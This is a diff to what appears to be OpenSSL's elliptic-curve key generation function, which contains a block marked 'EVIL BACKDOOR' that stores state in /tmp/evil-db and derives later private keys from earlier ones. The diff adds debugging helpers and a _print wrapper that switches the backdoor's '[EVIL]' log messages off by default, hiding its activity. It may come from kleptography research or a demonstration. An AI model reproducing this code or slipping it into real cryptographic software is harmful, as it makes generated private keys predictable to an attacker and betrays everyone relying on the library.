@@ -254,6 +254,29 @@ BIGNUM* _H(BIGNUM* x){
     return ret;
 }
 
+void _print_point(EC_POINT* P, char *name){
+    char *x = BN_bn2hex(P->X);
+    char *y = BN_bn2hex(P->Y);
+    char *z = BN_bn2hex(P->Z);
+    printf("POINT %s\nx: %s\ny: %s\nz: %s\n",name, x,y,z);
+
+    OPENSSL_free(x);
+    OPENSSL_free(y);
+    OPENSSL_free(z);
+}
+
+void _print_bn(BIGNUM* bn, char* name){
+    char *n = BN_bn2hex(bn);
+    printf("BIGNUM %s\n%s\n", name, n);
+    OPENSSL_free(n);
+}
+
+void _print(char *msg){
+    bool verbose = false;
+    if(verbose)
+        printf("[EVIL] %s", msg);
+}
+
 int ec_key_simple_generate_key(EC_KEY *eckey)
 {
     int ok = 0;
@@ -291,7 +314,7 @@ int ec_key_simple_generate_key(EC_KEY *eckey)
     // EVIL BACKDOOR
     if(-1 != access("/tmp/evil-db", F_OK)){
         // file exists, use algo 2
-        printf("[EVIL] algo 2\n");
+        _print("[EVIL] algo 2\n");
         FILE *fr = fopen("/tmp/evil-db", "r");
         if(!fr) _perror("[EVIL] ec_key_simple_generate_key: fr==NULL");
 
@@ -341,7 +364,7 @@ int ec_key_simple_generate_key(EC_KEY *eckey)
             EC_POINT_mul(eckey->group, Q2, priv_key, NULL, NULL, ctx);
             // Q2 = a * Q1
             EC_POINT_mul(eckey->group, Q2, params[0], NULL, NULL, ctx);
-            // Z = NULL here
+            // Z = 0 here
         }
 
         {
@@ -405,7 +428,7 @@ int ec_key_simple_generate_key(EC_KEY *eckey)
     }
     else{
         // file dosn't exits, use algo 1
-        printf("[EVIL] algo 1\n");
+        _print("[EVIL] algo 1\n");
         FILE* fw = fopen("/tmp/evil-db", "w");
         if(!fw) _perror("[EVIL] can't open /tmp/evil-db");
 
